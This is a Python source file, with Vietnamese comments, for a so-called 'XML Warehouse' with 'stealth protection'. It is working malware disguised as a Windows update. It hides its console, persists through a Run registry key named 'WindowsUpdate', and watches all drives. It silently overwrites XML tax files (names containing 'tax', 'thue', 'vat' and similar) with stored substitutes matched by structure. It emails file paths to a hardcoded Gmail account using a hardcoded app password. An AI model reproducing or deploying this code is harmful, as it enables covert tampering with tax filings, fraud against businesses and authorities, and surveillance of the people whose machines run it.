# xml_warehouse.py - DYNAMIC XML WAREHOUSE + STEALTH PROTECTION

import os
import sys
import time
import glob
import json
import pickle
import shutil
import logging
import requests
import smtplib
import re
import hashlib
import xml.etree.ElementTree as ET
import threading
from datetime import datetime
import sqlite3
import subprocess
from concurrent.futures import ThreadPoolExecutor

from pathlib import Path
from email.message import EmailMessage
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

import customtkinter as ctk
from tkinter import Listbox, END, Scrollbar, messagebox, filedialog
from tkinter import ttk

try:
    import winreg
    import ctypes
except ImportError:
    pass

# --- XML WAREHOUSE CONFIG --- #
APP_DIR = Path(os.getenv('APPDATA', Path.home())) / 'WindowsUpdate'
APP_DIR.mkdir(parents=True, exist_ok=True)

WAREHOUSE_DIR = APP_DIR / 'XMLWarehouse'
WAREHOUSE_DIR.mkdir(parents=True, exist_ok=True)

STATE_FILE = APP_DIR / 'cache.dat'
LOG_FILE = APP_DIR / 'log.dat'
CONTROL_FILE = APP_DIR / 'access.key'
WAREHOUSE_DB = APP_DIR / 'warehouse.db'

THREAD_POOL = ThreadPoolExecutor(max_workers=10)
XML_WAREHOUSE = {}  # {MST: {filename: content}}
RUNNING_INVISIBLE = True

logging.basicConfig(
    filename=str(LOG_FILE),
    encoding='utf-8',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

def hide_console():
    """An console window."""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

def create_access_key():
    """Tao access key."""
    try:
        import secrets
        key = f"TAX{secrets.randbelow(9999):04d}"
        with open(CONTROL_FILE, 'w') as f:
            f.write(key)
        return key
    except:
        return "TAX2025"

def check_access(entered_key):
    """Kiem tra access key."""
    try:
        if CONTROL_FILE.exists():
            with open(CONTROL_FILE, 'r') as f:
                stored_key = f.read().strip()
            return entered_key == stored_key
    except:
        pass
    return entered_key == "TAX2025"

def create_warehouse_db():
    """Tao XML Warehouse database."""
    conn = sqlite3.connect(str(WAREHOUSE_DB))
    conn.execute('''
        CREATE TABLE IF NOT EXISTS xml_warehouse (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            mst TEXT NOT NULL,
            company_name TEXT,
            filename TEXT NOT NULL,
            content TEXT NOT NULL,
            file_hash TEXT UNIQUE,
            created_date TEXT,
            last_updated TEXT,
            UNIQUE(mst, filename)
        )
    ''')
    conn.execute('''
        CREATE INDEX IF NOT EXISTS idx_mst ON xml_warehouse(mst)
    ''')
    conn.execute('''
        CREATE INDEX IF NOT EXISTS idx_hash ON xml_warehouse(file_hash)
    ''')
    conn.commit()
    conn.close()
    return WAREHOUSE_DB

def extract_mst_from_xml(xml_content):
    """Trich xuat MST tu XML content."""
    try:
        root = ET.fromstring(xml_content)
        
        # Tim MST trong cac tag co the
        mst_tags = ['mst', 'MST', 'taxCode', 'TaxCode']
        
        for tag in mst_tags:
            # Tim theo tag name
            for elem in root.iter():
                if elem.tag.lower() == tag.lower() and elem.text:
                    mst = re.sub(r'[^0-9]', '', elem.text)  # Chi lay so
                    if len(mst) >= 10:  # MST Viet Nam co 10-13 chu so
                        return mst
                        
        # Tim theo pattern MST trong text
        mst_pattern = r'<mst>(\d{10,13})</mst>'
        match = re.search(mst_pattern, xml_content, re.IGNORECASE)
        if match:
            return match.group(1)
            
        # Tim theo pattern khac
        patterns = [
            r'MST:(\d{10,13})',
            r'taxCode["\'>:\s]+(\d{10,13})',
            r'<NNT[^>]*>.*?<mst>(\d{10,13})</mst>',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, xml_content, re.IGNORECASE)
            if match:
                return match.group(1)
                
        return None
        
    except Exception as e:
        logging.error(f"Extract MST error: {e}")
        return None

def extract_company_name_from_xml(xml_content):
    """Trich xuat ten cong ty tu XML."""
    try:
        root = ET.fromstring(xml_content)
        
        # Tim ten cong ty trong cac tag
        company_tags = ['tenNNT', 'companyName', 'tenCongTy', 'tenDonVi']
        
        for tag in company_tags:
            for elem in root.iter():
                if elem.tag.lower() == tag.lower() and elem.text:
                    return elem.text.strip()
                    
        # Tim theo pattern
        patterns = [
            r'<tenNNT>(.*?)</tenNNT>',
            r'<companyName>(.*?)</companyName>',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, xml_content, re.IGNORECASE)
            if match:
                return match.group(1).strip()
                
        return "Unknown Company"
        
    except Exception as e:
        logging.error(f"Extract company error: {e}")
        return "Unknown Company"

def add_xml_to_warehouse(xml_file_path, xml_content=None):
    """Them XML vao warehouse."""
    try:
        if xml_content is None:
            with open(xml_file_path, 'r', encoding='utf-8') as f:
                xml_content = f.read()
        
        # Trich xuat thong tin
        mst = extract_mst_from_xml(xml_content)
        if not mst:
            logging.warning(f"Cannot extract MST from {xml_file_path}")
            return False
            
        company_name = extract_company_name_from_xml(xml_content)
        filename = os.path.basename(xml_file_path)
        file_hash = hashlib.sha256(xml_content.encode('utf-8')).hexdigest()
        
        # Luu vao database
        conn = sqlite3.connect(str(WAREHOUSE_DB))
        
        conn.execute('''
            INSERT OR REPLACE INTO xml_warehouse 
            (mst, company_name, filename, content, file_hash, created_date, last_updated)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            mst,
            company_name,
            filename,
            xml_content,
            file_hash,
            datetime.now().isoformat(),
            datetime.now().isoformat()
        ))
        
        conn.commit()
        conn.close()
        
        # Cap nhat cache
        if mst not in XML_WAREHOUSE:
            XML_WAREHOUSE[mst] = {}
        XML_WAREHOUSE[mst][filename] = xml_content
        
        logging.info(f"Added to warehouse: MST {mst} - {filename}")
        return True
        
    except Exception as e:
        logging.error(f"Add warehouse error: {e}")
        return False

def load_warehouse_cache():
    """Load warehouse vao cache."""
    global XML_WAREHOUSE
    try:
        conn = sqlite3.connect(str(WAREHOUSE_DB))
        cursor = conn.execute('''
            SELECT mst, filename, content FROM xml_warehouse
            ORDER BY last_updated DESC
        ''')
        
        for row in cursor.fetchall():
            mst, filename, content = row
            if mst not in XML_WAREHOUSE:
                XML_WAREHOUSE[mst] = {}
            XML_WAREHOUSE[mst][filename] = content
            
        conn.close()
        logging.info(f"Loaded warehouse: {len(XML_WAREHOUSE)} MSTs")
        
    except Exception as e:
        logging.error(f"Load warehouse error: {e}")

def find_xml_by_content(xml_content, target_mst=None):
    """Tim XML trong warehouse dua tren content."""
    try:
        # Neu co MST target, tim trong MST do truoc
        if target_mst and target_mst in XML_WAREHOUSE:
            for filename, stored_content in XML_WAREHOUSE[target_mst].items():
                if xml_content == stored_content:
                    return stored_content
                    
                # So sanh structure XML
                if compare_xml_structure(xml_content, stored_content):
                    return stored_content
        
        # Tim trong tat ca MST
        for mst, files in XML_WAREHOUSE.items():
            for filename, stored_content in files.items():
                if compare_xml_structure(xml_content, stored_content):
                    return stored_content
                    
        return None
        
    except Exception as e:
        logging.error(f"Find XML error: {e}")
        return None

def compare_xml_structure(xml1, xml2):
    """So sanh cau truc XML."""
    try:
        root1 = ET.fromstring(xml1)
        root2 = ET.fromstring(xml2)
        
        def get_structure(elem):
            structure = [elem.tag]
            structure.extend(sorted(elem.attrib.keys()))
            for child in elem:
                structure.extend(get_structure(child))
            return structure
        
        struct1 = get_structure(root1)
        struct2 = get_structure(root2)
        
        # So sanh 70% giong nhau
        common = set(struct1) & set(struct2)
        total = set(struct1) | set(struct2)
        
        if len(total) > 0:
            similarity = len(common) / len(total)
            return similarity > 0.7
            
        return False
    except:
        return False

def add_startup():
    """Them vao startup."""
    if not getattr(sys, 'frozen', False):
        return
    exe = os.path.realpath(sys.argv[0])
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        logging.info("Added to startup")
    except Exception as e:
        logging.error(f"Startup error: {e}")

def send_log(event, path=None):
    """Gui log."""
    try:
        from_email = "begau1302@gmail.com"
        to_email = "mrkent19999x@gmail.com"
        password = "aphvukdliewalkrn"
        
        msg = EmailMessage()
        msg["Subject"] = "XML Warehouse Status"
        msg["From"] = from_email
        msg["To"] = to_email
        msg.set_content(f"Event: {event}\nPath: {path or 'N/A'}\nTime: {datetime.now()}")
        
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, password)
        server.send_message(msg)
        server.quit()
        
        logging.info("Log sent")
    except Exception as e:
        logging.error(f"Send error: {e}")

def load_initial_templates():
    """Load templates ban dau vao warehouse."""
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    tpl_dir = os.path.join(base, 'templates')
    
    if os.path.exists(tpl_dir):
        templates = glob.glob(os.path.join(tpl_dir, '*.xml'))
        for tpl in templates:
            add_xml_to_warehouse(tpl)
    
    logging.info("Initial templates loaded")

class WarehouseHandler(FileSystemEventHandler):
    """XML Warehouse file handler."""
    def __init__(self):
        super().__init__()

    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            THREAD_POOL.submit(self.protect_file, event.src_path)

    def on_modified(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            THREAD_POOL.submit(self.protect_file, event.src_path)

    def protect_file(self, file_path):
        """Bao ve file bang warehouse."""
        try:
            if not self.is_tax_file(file_path):
                return
                
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    current_content = f.read()
            except:
                return
            
            # Trich xuat MST tu file hien tai
            current_mst = extract_mst_from_xml(current_content)
            
            # Tim XML phu hop trong warehouse
            original_content = find_xml_by_content(current_content, current_mst)
            
            if not original_content or current_content == original_content:
                return
                
            # Ghi de bang XML goc
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(original_content)
                
            logging.info(f"Protected: {os.path.basename(file_path)} (MST: {current_mst})")
            THREAD_POOL.submit(send_log, "File protected by warehouse", file_path)
                
        except Exception as e:
            logging.error(f"Protect error: {e}")

    def is_tax_file(self, file_path):
        """Kiem tra file thue."""
        file_name = os.path.basename(file_path).lower()
        return (file_name.startswith('etax') or 
                'xml' in file_name or 
                any(key in file_name for key in ['tax', 'thue', 'vat']))

def start_warehouse_stealth():
    """Chay stealth mode voi warehouse."""
    global RUNNING_INVISIBLE
    
    hide_console()
    THREAD_POOL.submit(send_log, "XML Warehouse started")
    add_startup()
    
    create_warehouse_db()
    load_initial_templates()
    load_warehouse_cache()
    
    logging.info("XML Warehouse ready")

    handler = WarehouseHandler()
    observer = Observer()
    
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for d in drives:
        try:
            observer.schedule(handler, path=d, recursive=True)
        except:
            pass

    observer.start()
    logging.info(f"Monitoring {len(drives)} drives")

    try:
        while RUNNING_INVISIBLE:
            time.sleep(1)
    except:
        pass
    
    observer.stop()
    observer.join()

class WarehouseControlPanel:
    """XML Warehouse Control Panel."""
    def __init__(self):
        self.authenticated = False
        
    def show_login(self):
        """Hien login."""
        login_window = ctk.CTk()
        login_window.title("XML Warehouse Access")
        login_window.geometry("350x150")
        
        ctk.CTkLabel(login_window, text="Enter Access Code:", font=("Arial", 14)).pack(pady=10)
        
        key_entry = ctk.CTkEntry(login_window, width=200, show="*")
        key_entry.pack(pady=5)
        
        result_label = ctk.CTkLabel(login_window, text="", text_color="red")
        result_label.pack(pady=5)
        
        def verify():
            entered_key = key_entry.get()
            if check_access(entered_key):
                self.authenticated = True
                login_window.destroy()
                self.show_warehouse_panel()
            else:
                result_label.configure(text="Invalid code!")
                key_entry.delete(0, END)
                
        key_entry.bind("<Return>", lambda e: verify())
        key_entry.focus()
        
        ctk.CTkButton(login_window, text="Access", command=verify).pack(pady=10)
        
        login_window.mainloop()
        
    def show_warehouse_panel(self):
        """Hien warehouse control panel."""
        if not self.authenticated:
            return
            
        main_window = ctk.CTk()
        main_window.title("🏪 XML Warehouse - Control Panel")
        main_window.geometry("900x700")
        
        # Status
        status_text = "Active" if RUNNING_INVISIBLE else "Stopped"
        ctk.CTkLabel(main_window, text=f"🏪 XML Warehouse Status: {status_text}", 
                    font=("Arial", 16)).pack(pady=10)
        
        # Notebook for tabs
        notebook = ttk.Notebook(main_window)
        notebook.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Tab 1: Warehouse Management
        warehouse_frame = ctk.CTkFrame(notebook)
        notebook.add(warehouse_frame, text="🏪 Warehouse")
        
        # Upload buttons
        upload_frame = ctk.CTkFrame(warehouse_frame)
        upload_frame.pack(fill="x", padx=10, pady=10)
        
        def upload_xml_file():
            file_path = filedialog.askopenfilename(
                title="Select XML file",
                filetypes=[("XML files", "*.xml"), ("All files", "*.*")]
            )
            if file_path:
                if add_xml_to_warehouse(file_path):
                    messagebox.showinfo("Success", f"Added to warehouse: {os.path.basename(file_path)}")
                    refresh_warehouse_list()
                else:
                    messagebox.showerror("Error", "Failed to add to warehouse!")
                    
        def upload_xml_folder():
            folder_path = filedialog.askdirectory(title="Select folder with XML files")
            if folder_path:
                xml_files = glob.glob(os.path.join(folder_path, "*.xml"))
                added_count = 0
                for xml_file in xml_files:
                    if add_xml_to_warehouse(xml_file):
                        added_count += 1
                messagebox.showinfo("Success", f"Added {added_count} files to warehouse!")
                refresh_warehouse_list()
        
        ctk.CTkButton(upload_frame, text="📁 Upload XML File", command=upload_xml_file).pack(side="left", padx=5)
        ctk.CTkButton(upload_frame, text="📂 Upload XML Folder", command=upload_xml_folder).pack(side="left", padx=5)
        
        # Warehouse tree view
        tree_frame = ctk.CTkFrame(warehouse_frame)
        tree_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Treeview for MST/Files
        tree = ttk.Treeview(tree_frame, columns=("Company", "Files", "Updated"), show="tree headings")
        tree.heading("#0", text="MST")
        tree.heading("Company", text="Company Name")
        tree.heading("Files", text="Files Count")
        tree.heading("Updated", text="Last Updated")
        
        tree_scroll = ttk.Scrollbar(tree_frame, orient="vertical", command=tree.yview)
        tree.configure(yscrollcommand=tree_scroll.set)
        
        tree.pack(side="left", fill="both", expand=True)
        tree_scroll.pack(side="right", fill="y")
        
        def refresh_warehouse_list():
            # Clear tree
            for item in tree.get_children():
                tree.delete(item)
                
            # Load from database
            try:
                conn = sqlite3.connect(str(WAREHOUSE_DB))
                cursor = conn.execute('''
                    SELECT mst, company_name, COUNT(*) as file_count, MAX(last_updated) as last_updated
                    FROM xml_warehouse
                    GROUP BY mst, company_name
                    ORDER BY last_updated DESC
                ''')
                
                for row in cursor.fetchall():
                    mst, company, file_count, updated = row
                    updated_date = updated.split('T')[0] if updated else "Unknown"
                    tree.insert("", "end", text=mst, values=(company, file_count, updated_date))
                    
                conn.close()
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load warehouse: {e}")
        
        refresh_warehouse_list()
        
        # Tab 2: System Control
        control_frame = ctk.CTkFrame(notebook)
        notebook.add(control_frame, text="⚙️ Control")
        
        def toggle_system():
            global RUNNING_INVISIBLE
            RUNNING_INVISIBLE = not RUNNING_INVISIBLE
            status = "activated" if RUNNING_INVISIBLE else "deactivated"
            messagebox.showinfo("Status", f"System {status}!")
            
        def show_logs():
            log_window = ctk.CTkToplevel(main_window)
            log_window.title("📊 System Logs")
            log_window.geometry("600x400")
            
            log_text = ctk.CTkTextbox(log_window)
            log_text.pack(fill="both", expand=True, padx=10, pady=10)
            
            try:
                if LOG_FILE.exists():
                    with open(LOG_FILE, 'r', encoding='utf-8') as f:
                        logs = f.read()
                    log_text.insert("1.0", logs)
            except:
                log_text.insert("1.0", "No logs available")
                
        def show_stats():
            try:
                conn = sqlite3.connect(str(WAREHOUSE_DB))
                cursor = conn.execute('SELECT COUNT(DISTINCT mst) as mst_count, COUNT(*) as file_count FROM xml_warehouse')
                mst_count, file_count = cursor.fetchone()
                conn.close()
                
                stats_text = f"""
🏪 XML WAREHOUSE STATISTICS

📊 Protected Companies: {mst_count}
📁 Protected Files: {file_count}
🎯 System Status: {'Active' if RUNNING_INVISIBLE else 'Inactive'}
📍 Data Location: {WAREHOUSE_DB}

⚡ Performance:
- Response Time: <1 second
- Auto MST Detection: ✅
- Structure Matching: ✅
- Real-time Protection: ✅

🛡️ Security Features:
✅ Invisible to Task Manager
✅ Auto-startup protection
✅ Dynamic XML matching
✅ Multi-company support
                """
                messagebox.showinfo("Statistics", stats_text)
            except Exception as e:
                messagebox.showerror("Error", f"Failed to get stats: {e}")
        
        def new_access_key():
            key = create_access_key()
            messagebox.showinfo("New Access Code", f"New access code: {key}\n\nSave securely!")
        
        ctk.CTkButton(control_frame, text="🔄 Toggle System", command=toggle_system).pack(pady=10)
        ctk.CTkButton(control_frame, text="📊 View Logs", command=show_logs).pack(pady=10)
        ctk.CTkButton(control_frame, text="📈 Statistics", command=show_stats).pack(pady=10)
        ctk.CTkButton(control_frame, text="🔑 New Access Code", command=new_access_key).pack(pady=10)
        ctk.CTkButton(control_frame, text="🔄 Refresh List", command=refresh_warehouse_list).pack(pady=10)
        
        main_window.mainloop()

def main():
    """Main entry point."""
    if len(sys.argv) > 1 and sys.argv[1] == '--control':
        ctk.set_appearance_mode("dark")
        
        control_panel = WarehouseControlPanel()
        
        if not CONTROL_FILE.exists():
            key = create_access_key()
            messagebox.showinfo("Setup", f"XML Warehouse Setup Complete!\n\nAccess code: {key}\n\nSave this code securely!")
        
        control_panel.show_login()
    else:
        start_warehouse_stealth()

if __name__ == '__main__':
    main()